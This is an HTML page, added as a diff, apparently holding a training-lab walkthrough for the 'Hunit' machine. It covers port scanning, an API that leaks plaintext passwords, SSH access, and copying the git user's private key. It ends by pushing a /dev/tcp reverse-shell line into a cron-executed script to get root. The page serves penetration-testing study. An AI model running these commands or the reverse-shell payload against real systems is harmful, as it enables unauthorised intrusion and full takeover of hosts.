@@ -1,0 +1,392 @@
+<div id="__BVID__12___BV_modal_content_" tabindex="-1" class="modal-content"><header id="__BVID__12___BV_modal_header_" class="modal-header"><h5 id="__BVID__12___BV_modal_title_" class="modal-title">Walkthrough</h5><button type="button" aria-label="Close" class="close">×</button></header><div id="__BVID__12___BV_modal_body_" class="modal-body"><div class="mb-2 flex-grow" on-finish="function() {
+    [native code]
+}"><div class="markdown-container"><div class="markdown-content text-black"><!----><div><h1>Exploitation Guide for Hunit</h1>
+<h2>Summary</h2>
+<p>In this scenario, we'll enumerate a web application and discover an API endpoint that leaks user information. This helps us obtain SSH access as a low-privileged user. We'll then find and extract a private SSH key for the <code>git</code> user, gaining privileges to push arbitrary updates to the <code>master</code> branch of a local repository. To escalate our privileges, we will clone the repository to our attack machine and inject a malicious payload using the <code>git</code> account.</p>
+<h2>Enumeration</h2>
+<h3>Nmap</h3>
+<p>We'll begin with an <code>nmap</code> scan against all TCP ports.</p>
+<pre id="fence-code-1" class="fence-code"><code>kali@kali:~$ sudo nmap -p- 192.168.120.204
+...
+Nmap scan report for 192.168.120.204
+PORT      STATE SERVICE
+8080/tcp  open  http-proxy
+12445/tcp open  unknown
+18030/tcp open  unknown
+43022/tcp open  unknown
+</code></pre>
+<p>Next, we'll run a more detailed "version" scan against the open ports.</p>
+<pre id="fence-code-2" class="fence-code"><code>kali@kali:~$  sudo nmap -sC -sV -p 8080,12445,18030,43022 192.168.120.204
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-09 16:39 -03
+Nmap scan report for 192.168.120.204
+Host is up (0.16s latency).
+
+PORT      STATE SERVICE     VERSION
+8080/tcp  open  http-proxy
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 
+|     Content-Type: text/html;charset=UTF-8
+|     Content-Language: en-US
+|     Content-Length: 3755
+|     Date: Mon, 09 Nov 2020 19:39:31 GMT
+|     Connection: close
+|     &lt;!DOCTYPE HTML&gt;
+|     &lt;!--
+|     Minimaxing by HTML5 UP
+|     html5up.net | @ajlkn
+|     Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;title&gt;My Haikus&lt;/title&gt;
+|     &lt;meta charset="utf-8" /&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" /&gt;
+|     &lt;link rel="stylesheet" href="/css/main.css" /&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;div id="page-wrapper"&gt;
+|     &lt;!-- Header --&gt;
+|     &lt;div id="header-wrapper"&gt;
+|     &lt;div class="container"&gt;
+|     &lt;div class="row"&gt;
+|     &lt;div class="col-12"&gt;
+|     &lt;header id="header"&gt;
+|     &lt;h1&gt;&lt;a href="/" id="logo"&gt;My Haikus&lt;/a&gt;&lt;/h1&gt;
+|     &lt;/header&gt;
+|     &lt;/div&gt;
+|     &lt;/div&gt;
+|     &lt;/div&gt;
+|     &lt;/div&gt;
+|     &lt;div id="main"&gt;
+|     &lt;div clas
+|   HTTPOptions: 
+|     HTTP/1.1 200 
+|     Allow: GET,HEAD,OPTIONS
+|     Content-Length: 0
+|     Date: Mon, 09 Nov 2020 19:39:31 GMT
+|     Connection: close
+|   RTSPRequest: 
+|     HTTP/1.1 505 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 465
+|     Date: Mon, 09 Nov 2020 19:39:31 GMT
+|     &lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 505 
+|     HTTP Version Not Supported&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 505 
+|_    HTTP Version Not Supported&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+|_http-title: My Haikus
+12445/tcp open  netbios-ssn Samba smbd 4.6.2
+18030/tcp open  http        Apache httpd 2.4.46 ((Unix))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 (Unix)
+|_http-title: Whack A Mole!
+43022/tcp open  ssh         OpenSSH 8.4 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 7b:fc:37:b4:da:6e:c5:8e:a9:8b:b7:80:f5:cd:09:cb (RSA)
+|   256 89:cd:ea:47:25:d9:8f:f8:94:c3:d6:5c:d4:05:ba:d0 (ECDSA)
+|_  256 c0:7c:6f:47:7e:94:cc:8b:f8:3d:a0:a6:1f:a9:27:11 (ED25519)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+...
+</code></pre>
+<p>This reveals a web server on port 8080, a Samba share on port 12445, an Apache web server on port 18030, and SSH on port 43022. In this case we'll focus on the web server on port 8080 and the SSH service.</p>
+<h3>CURL</h3>
+<p>Let's start by enumerating the website on port 8080. The default page (http://192.168.120.204:8080/) contains several links, the first of which points to <strong>/article/the-taste-of-rain</strong>.</p>
+<pre id="fence-code-3" class="fence-code"><code>kali@kali:~$ curl http://192.168.120.204:8080/
+...
+&lt;section&gt;
+        &lt;header class="article-header"&gt;
+                &lt;h2 class="article-title"&gt;&lt;a href="/article/the-taste-of-rain"&gt;The Taste of Rain&lt;/a&gt;&lt;/h2&gt;
+                &lt;div class="article-meta"&gt;By  &lt;strong&gt;James&lt;/strong&gt;, on &lt;strong&gt;2021-01-14 14th 2021&lt;/strong&gt;&lt;/div&gt;
+        &lt;/header&gt;
+        &lt;div class="article-headline"&gt;
+                Jack Kerouac
+        &lt;/div&gt;
+&lt;/section&gt;
+...
+</code></pre>
+<p>Let's follow that link.</p>
+<pre id="fence-code-4" class="fence-code"><code>kali@kali:~$ curl http://192.168.120.204:8080/article/the-taste-of-rain
+...
+&lt;section class="article"&gt;
+	&lt;header class="article-header"&gt;
+		&lt;h1 class="article-title"&gt;The Taste of Rain&lt;/h1&gt;
+		&lt;p class="article-meta"&gt;By  &lt;strong&gt;James&lt;/strong&gt;, on &lt;strong&gt;2020-11-09 9th 2020&lt;/strong&gt;&lt;/p&gt;
+	&lt;/header&gt;
+
+	&lt;div class="article-description"&gt;
+		&lt;div&gt;Jack Kerouac&lt;/div&gt;
+		<span class="warning-item">
+		<span class="warning-item">
+		<span class="warning-item">
+
+		&lt;p&gt;The taste, Of rain, —Why kneel?&lt;/p&gt;
+	&lt;/div&gt;
+&lt;/section&gt;
+
+&lt;!--
+&lt;a href="http://localhost:8080/api/"&gt;List all&lt;/a&gt;
+--&gt;
+...
+</span></span></span></code></pre>
+<p>A comment on the page suggests the presence of an API located in the <strong>/api/</strong> directory.</p>
+<h2>Exploitation</h2>
+<h3>Credential Leak</h3>
+<p>After a brief exploration of the API, we discover an information leak.</p>
+<pre id="fence-code-5" class="fence-code"><code>kali@kali:~$ curl http://192.168.120.204:8080/api/         
+[{"string":"/api/","id":13},{"string":"/article/","id":14},{"string":"/article/?","id":15},{"string":"/user/","id":16},{"string":"/user/?","id":17}]        
+</code></pre>
+<p>The <strong>/user/</strong> endpoint is certainly worth inspection.</p>
+<pre id="fence-code-6" class="fence-code"><code>kali@kali:~$ curl http://192.168.120.204:8080/api/user/
+[{"login":"rjackson","password":"yYJcgYqszv4aGQ","firstname":"Richard","lastname":"Jackson","description":"Editor","id":1},
+{"login":"jsanchez","password":"d52cQ1BzyNQycg","firstname":"Jennifer","lastname":"Sanchez","description":"Editor","id":3},
+{"login":"dademola","password":"ExplainSlowQuest110","firstname":"Derik","lastname":"Ademola","description":"Admin","id":6},
+{"login":"jwinters","password":"KTuGcSW6Zxwd0Q","firstname":"Julie","lastname":"Winters","description":"Editor","id":7},
+{"login":"jvargas","password":"OuQ96hcgiM5o9w","firstname":"James","lastname":"Vargas","description":"Editor","id":10}]%  
+</code></pre>
+<p>This endpoint leaks several username-password pairs.</p>
+<h3>SSH</h3>
+<p>Let's try to leverage these credentials against the SSH service running on port 43022 in an attempt to gain an initial foothold.</p>
+<pre id="fence-code-7" class="fence-code"><code>kali@kali:~$ ssh -p 43022 dademola@192.168.120.204
+...
+dademola@192.168.120.204's password: 
+[dademola@hunit ~]$ id
+uid=1001(dademola) gid=1001(dademola) groups=1001(dademola)
+[dademola@hunit ~]$
+</code></pre>
+<p>The <code>dademola:ExplainSlowQuest110</code> credentials grant us access. We have our foothold!</p>
+<h2>Escalation</h2>
+<h3>Crontab Backup File Enumeration</h3>
+<p>After some initial enumeration, we discover a crontab backup in the <strong>/etc</strong> folder.</p>
+<pre id="fence-code-8" class="fence-code"><code>[dademola@hunit ~]$ ls -l /etc
+total 780
+...
+drwxr-xr-x 2 root root   4096 Nov  6 18:09 conf.d
+drwxr-xr-x 2 root root   4096 Nov  5 23:46 cron.d
+drwxr-xr-x 2 root root   4096 Oct 31  2019 cron.daily
+-rw-r--r-- 1 root root     74 Oct 31  2019 cron.deny
+drwxr-xr-x 2 root root   4096 Nov  5 23:46 cron.hourly
+drwxr-xr-x 2 root root   4096 Oct 31  2019 cron.monthly
+drwxr-xr-x 2 root root   4096 Oct 31  2019 cron.weekly
+-rw-r--r-- 1 root root     67 Nov 10 15:31 crontab.bak
+...
+</code></pre>
+<p>The contents of the <strong>/etc/crontab.bak</strong> file are certainly interesting:</p>
+<pre id="fence-code-9" class="fence-code"><code>[dademola@hunit ~]$ cat /etc/crontab.bak 
+*/3 * * * * /root/git-server/backups.sh
+*/2 * * * * /root/pull.sh
+[dademola@hunit ~]$ 
+</code></pre>
+<p>This file lists two jobs that are run from the  <strong>/root</strong> directory. This is obviously a potential vulnerability which requires further examination.</p>
+<h3>Git Server Enumeration</h3>
+<p>As is typical, any attempt to access <strong>/root</strong> as this user generates a "permission denied" error. However, we do discover that <strong>git-server</strong> exists in <strong>/</strong>.</p>
+<pre id="fence-code-10" class="fence-code"><code>[dademola@hunit ~]$ find / -type d -name git-server -print 2&gt;/dev/null
+/git-server
+[dademola@hunit ~]$ 
+[dademola@hunit ~]$ ls -l /git-server/
+total 32
+-rw-r--r--  1 git git   23 Nov  5 22:33 HEAD
+drwxr-xr-x  2 git git 4096 Nov  5 22:33 branches
+-rw-r--r--  1 git git   66 Nov  5 22:33 config
+-rw-r--r--  1 git git   73 Nov  5 22:33 description
+drwxr-xr-x  2 git git 4096 Nov  5 22:33 hooks
+drwxr-xr-x  2 git git 4096 Nov  5 22:33 info
+drwxr-xr-x 16 git git 4096 Nov  6 00:06 objects
+drwxr-xr-x  4 git git 4096 Nov  5 22:33 refs
+</code></pre>
+<p>Inspecting these files, we discover that they are git backend files, which are somewhat difficult to work with. Let's instead attempt to clone <strong>/git-server</strong> to determine what's inside.</p>
+<pre id="fence-code-11" class="fence-code"><code>[dademola@hunit ~]$ git clone file:///git-server/ 
+Cloning into 'git-server'...
+remote: Enumerating objects: 12, done.
+remote: Counting objects: 100% (12/12), done.
+remote: Compressing objects: 100% (9/9), done.
+remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (12/12), done.
+Resolving deltas: 100% (2/2), done.
+</code></pre>
+<p>This works. Let's inspect the directory contents.</p>
+<pre id="fence-code-12" class="fence-code"><code>[dademola@hunit ~]$ ls -la git-server
+total 20
+drwxr-xr-x 3 dademola dademola 4096 Nov 10 15:40 .
+drwx------ 7 dademola dademola 4096 Nov 10 15:53 ..
+drwxr-xr-x 8 dademola dademola 4096 Nov 10 15:54 .git
+-rw-r--r-- 1 dademola dademola    0 Nov 10 15:40 NEW_CHANGE
+-rw-r--r-- 1 dademola dademola   63 Nov 10 15:40 README
+-rw-r--r-- 1 dademola dademola   60 Nov 10 15:52 backups.sh
+</code></pre>
+<p>Next, we'll attempt to grab the repository's log.</p>
+<pre id="fence-code-13" class="fence-code"><code>[dademola@hunit ~]$ cd git-server
+
+[dademola@hunit git-server]$ git log
+commit b50f4e5415cae0b650836b5466cc47c62faf7341 (HEAD -&gt; master, origin/master, origin/HEAD)
+Author: Dademola &lt;dade@local.host&gt;
+Date:   Thu Nov 5 21:05:58 2020 -0300
+
+    testing
+
+commit c71132590f969b535b315089f83f39e48d0021e2
+Author: Dademola &lt;dade@local.host&gt;
+Date:   Thu Nov 5 20:59:48 2020 -0300
+
+    testing
+...
+</code></pre>
+<p>There's not much here. Let's review the contents of the <strong>backups.sh</strong> script.</p>
+<pre id="fence-code-14" class="fence-code"><code>[dademola@hunit git-server]$ cat backups.sh 
+#!/bin/bash
+#
+#
+# # Placeholder
+#
+</code></pre>
+<p>This is simply a placeholder. Based on out knowledge of <code>git</code>, we can deduce that the <strong>/root/pull.sh</strong> script (which was referenced in the crontab backup file) pulls the changes done to the repository's <code>master</code> branch. To test this theory, we'll try to inject some code into the <strong>backups.sh</strong> script and then push the changes. First, we'll set up our Git identity.</p>
+<pre id="fence-code-15" class="fence-code"><code>[dademola@hunit git-server]$ git config --global user.name "dademola"
+[dademola@hunit git-server]$ git config --global user.email "dademola@hunit.(none)"
+</code></pre>
+<p>Next, we'll inject a test instruction.</p>
+<pre id="fence-code-16" class="fence-code"><code>[dademola@hunit git-server]$ echo "touch /tmp/gitscript-test" &gt;&gt; backups.sh
+</code></pre>
+<p>Before adding and committing the updated script, we'll make it executable.</p>
+<pre id="fence-code-17" class="fence-code"><code>[dademola@hunit git-server]$ chmod +x backups.sh 
+</code></pre>
+<p>Finally, we'll add and commit our changes and attempt to push them to the <code>master</code> branch.</p>
+<pre id="fence-code-18" class="fence-code"><code>[dademola@hunit git-server]$ git add -A
+[dademola@hunit git-server]$ git commit -m "pwn"
+[master 159de6f] pwn
+ 1 file changed, 1 insertion(+)
+
+[dademola@hunit git-server]$ git push origin master
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Delta compression using up to 2 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 290 bytes | 290.00 KiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
+error: remote unpack failed: unable to create temporary object directory
+To file:///git-server/
+ ! [remote rejected] master -&gt; master (unpacker error)
+error: failed to push some refs to 'file:///git-server/'
+</code></pre>
+<p>Unfortunately, we are not allowed to make changes to this repository. Further inspection reveals that the contents of the <strong>/git-server</strong> are owned by the <code>git</code> user.</p>
+<pre id="fence-code-19" class="fence-code"><code>dademola@hunit git-server]$ ls -la /git-server
+total 40
+drwxr-xr-x  7 git  git  4096 Nov  6 00:06 .
+drwxr-xr-x 18 root root 4096 Nov 10 15:29 ..
+-rw-r--r--  1 git  git    23 Nov  5 22:33 HEAD
+drwxr-xr-x  2 git  git  4096 Nov  5 22:33 branches
+-rw-r--r--  1 git  git    66 Nov  5 22:33 config
+-rw-r--r--  1 git  git    73 Nov  5 22:33 description
+drwxr-xr-x  2 git  git  4096 Nov  5 22:33 hooks
+drwxr-xr-x  2 git  git  4096 Nov  5 22:33 info
+drwxr-xr-x 16 git  git  4096 Nov  6 00:06 objects
+drwxr-xr-x  4 git  git  4096 Nov  5 22:33 refs
+</code></pre>
+<h3>Git User SSH</h3>
+<p>According to <strong>/etc/passwd</strong>, the <code>git</code> user exists and uses <strong>/usr/bin/git-shell</strong> as the default shell.</p>
+<pre id="fence-code-20" class="fence-code"><code>[dademola@hunit git-server]$ grep git /etc/passwd      
+git:x:1005:1005::/home/git:/usr/bin/git-shell
+</code></pre>
+<p>As referenced in the password file, <strong>/home/git</strong> exists.</p>
+<pre id="fence-code-21" class="fence-code"><code>[dademola@hunit git-server]$ ls -l /home 
+total 8
+drwx------ 7 dademola dademola 4096 Jan 14 18:28 dademola
+drwxr-xr-x 4 git      git      4096 Nov  5 22:35 git
+</code></pre>
+<p>This folder contains a <strong>.ssh</strong> folder.</p>
+<pre id="fence-code-22" class="fence-code"><code>[dademola@hunit ~]$ ls -la /home/git
+total 28
+drwxr-xr-x 4 git  git  4096 Nov  5 22:35 .
+drwxr-xr-x 4 root root 4096 Nov  5 22:28 ..
+-rw------- 1 git  git     0 Nov  6 00:26 .bash_history
+-rw-r--r-- 1 git  git    21 Aug  9 16:27 .bash_logout
+-rw-r--r-- 1 git  git    57 Aug  9 16:27 .bash_profile
+-rw-r--r-- 1 git  git   141 Aug  9 16:27 .bashrc
+drwxr-xr-x 2 git  git  4096 Nov  5 22:31 .ssh
+drwxr-xr-x 2 git  git  4096 Nov  5 22:35 git-shell-commands
+</code></pre>
+<p>Within this folder, we discover an <strong>id_rsa</strong> private key file.</p>
+<pre id="fence-code-23" class="fence-code"><code>[dademola@hunit git-server]$ ls -l /home/git/.ssh
+total 12
+-rwxr-xr-x 1 root root  564 Nov  5 22:31 authorized_keys
+-rwxr-xr-x 1 root root 2590 Nov  5 22:31 id_rsa
+-rwxr-xr-x 1 root root  564 Nov  5 22:31 id_rsa.pub
+</code></pre>
+<p>Interestingly, the <strong>authorized_keys</strong> and <strong>id_rsa.pub</strong> files are the same size, and the contents appear identical:</p>
+<pre id="fence-code-24" class="fence-code"><code>[dademola@hunit ~]$ cat /home/git/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2+L7/MgU/MJ+fYIEXEa1+WA9/qMvFj1kUTBk0dtCODfandxZvNAbBFY1JWUFjOPqxc+NxZNFzunTxYdv3/zkvT9/3iV9dQgH2m2Kkv0QfFJQPEaug/rQf2MlOPQq563LUb7FLK2L75COLqHGa5GtDh7lDqUGfzj8JcCdEfoYtgVHLAkRdC0scLC2WFUSo/sdkBYu0MWdZBXt4wX1EI0FVJYFt5AhNtkNJty2Dk/QffmKg+7rs/KCj1J9JFekE9UEjXd94EgjZXeIv4FDLqx4KPu0eP2k1hkVaOugpUIFmSgt8uxMdGRcMotEgK9wfDXI5ZR/iwU2deRyUcLGwRTp0kP2TuHCcrUSz5CCVdBJLQk6Y/BN+lGStfV3bsrfWuhA/9gZVtkkSLey0CZpneJDVxAzLY1DoRKi6k11B5UXLQThymn80PJrOH++3aKtzp9Q36N0W8JZlsg7qmaX4dY5TdTcDEVNJeZuuMwdqECvEyr8m1TAlq7LDT0Uq3JwQ7fM= root@hunit
+[dademola@hunit ~]$ 
+[dademola@hunit ~]$ cat /home/git/.ssh/id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2+L7/MgU/MJ+fYIEXEa1+WA9/qMvFj1kUTBk0dtCODfandxZvNAbBFY1JWUFjOPqxc+NxZNFzunTxYdv3/zkvT9/3iV9dQgH2m2Kkv0QfFJQPEaug/rQf2MlOPQq563LUb7FLK2L75COLqHGa5GtDh7lDqUGfzj8JcCdEfoYtgVHLAkRdC0scLC2WFUSo/sdkBYu0MWdZBXt4wX1EI0FVJYFt5AhNtkNJty2Dk/QffmKg+7rs/KCj1J9JFekE9UEjXd94EgjZXeIv4FDLqx4KPu0eP2k1hkVaOugpUIFmSgt8uxMdGRcMotEgK9wfDXI5ZR/iwU2deRyUcLGwRTp0kP2TuHCcrUSz5CCVdBJLQk6Y/BN+lGStfV3bsrfWuhA/9gZVtkkSLey0CZpneJDVxAzLY1DoRKi6k11B5UXLQThymn80PJrOH++3aKtzp9Q36N0W8JZlsg7qmaX4dY5TdTcDEVNJeZuuMwdqECvEyr8m1TAlq7LDT0Uq3JwQ7fM= root@hunit
+[dademola@hunit ~]$
+</code></pre>
+<p>A <code>diff</code> reveals that the files are, in fact, identical.</p>
+<pre id="fence-code-25" class="fence-code"><code>[dademola@hunit ~]$ diff /home/git/.ssh/authorized_keys /home/git/.ssh/id_rsa.pub
+[dademola@hunit ~]$
+</code></pre>
+<p>Since the <strong>id_rsa.pub</strong> public key is in the <strong>authorized_keys</strong> file, we should be able to use the private key to log in via SSH. Let's copy this private key to our attack machine and apply the proper permissions.</p>
+<pre id="fence-code-26" class="fence-code"><code>kali@kali:~$ scp -P 43022 dademola@192.168.120.204:/home/git/.ssh/id_rsa .
+dademola@192.168.120.204's password: 
+id_rsa   100% 2590    19.2KB/s   00:00    
+kali@kali:~$
+kali@kali:~$ chmod 0600 id_rsa 
+</code></pre>
+<p>Next, we'll attempt to use this private key to log in as the <code>git</code> user.</p>
+<pre id="fence-code-27" class="fence-code"><code>kali@kali:~$ ssh -p 43022 git@192.168.120.204 -i id_rsa
+git&gt; 
+</code></pre>
+<p>The key works, and our login attempt is successful!</p>
+<h3>Reverse Shell</h3>
+<p>Since this is a <strong>git-shell</strong>, we should be able to interact with the repository. Let's clone this repo on our attack machine.</p>
+<pre id="fence-code-28" class="fence-code"><code>kali@kali:~$ GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.120.204:/git-server
+Cloning into 'git-server'...
+remote: Enumerating objects: 12, done.
+remote: Counting objects: 100% (12/12), done.
+remote: Compressing objects: 100% (9/9), done.
+remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (12/12), done.
+Resolving deltas: 100% (2/2), done.
+</code></pre>
+<p>Now we can again attempt to push our changes to the <code>master</code> branch. As before, we'll first configure our Git identity.</p>
+<pre id="fence-code-29" class="fence-code"><code>kali@kali:~$ cd git-server
+kali@kali:~/git-server$ git config --global user.name "kali"
+kali@kali:~/git-server$ git config --global user.email "kali@kali.(none)"
+</code></pre>
+<p>Next, we'll inject a reverse shell payload into the <strong>backups.sh</strong> script and make it executable.</p>
+<pre id="fence-code-30" class="fence-code"><code>kali@kali:~/git-server$ echo "sh -i &gt;&amp; /dev/tcp/192.168.118.8/8080 0&gt;&amp;1" &gt;&gt; backups.sh 
+kali@kali:~/git-server$ chmod +x backups.sh
+</code></pre>
+<p>Let's add and commit our changes.</p>
+<pre id="fence-code-31" class="fence-code"><code>kali@kali:~/git-server$ git add -A
+kali@kali:~/git-server$ git commit -m "pwn"
+[master cb7104c] pwn
+ 1 file changed, 1 insertion(+)
+ mode change 100644 =&gt; 100755 backups.sh
+</code></pre>
+<p>Before pushing our payload, we'll set up a Netcat listener on port 8080.</p>
+<pre id="fence-code-32" class="fence-code"><code>kali@kali:~$ nc -lvnp 8080 
+listening on [any] 8080 ...
+</code></pre>
+<p>Once our listener is ready, we'll attempt to push to the <code>master</code> branch.</p>
+<pre id="fence-code-33" class="fence-code"><code>kali@kali:~/git-server$ GIT_SSH_COMMAND='ssh -i ~/id_rsa -p 43022' git push origin master
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Delta compression using up to 4 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 302 bytes | 302.00 KiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
+To 192.168.120.204:/git-server
+   b50f4e5..0212790  master -&gt; master
+kali@kali:~/git-server$ 
+</code></pre>
+<p>The crontab backup file indicates that the <strong>pull.sh</strong> script runs every two minutes, and the <strong>backups.sh</strong> script runs every three minutes. Because of this, it may take up to five minutes to determine if our attack was successful.</p>
+<p>Once our changes are synchronized, and our payload is executed inside the <strong>backups.sh</strong> script, we should receive our <code>root</code> user shell.</p>
+<pre id="fence-code-34" class="fence-code"><code>kali@kali:~$ nc -lvnp 8080 
+listening on [any] 8080 ...
+connect to [192.168.118.8] from (UNKNOWN) [192.168.120.204] 51816
+...
+sh-5.0# whoami
+root
+</code></pre>
+</div><!----></div></div><div class="d-flex flex-row full-width mt-4 mb-1 justify-content-end"><button type="button" class="btn transparent-btn mb-2 pl-0 pr-0 btn-link btn-lg">
+      Close
+    </button><!----></div></div></div><!----></div>
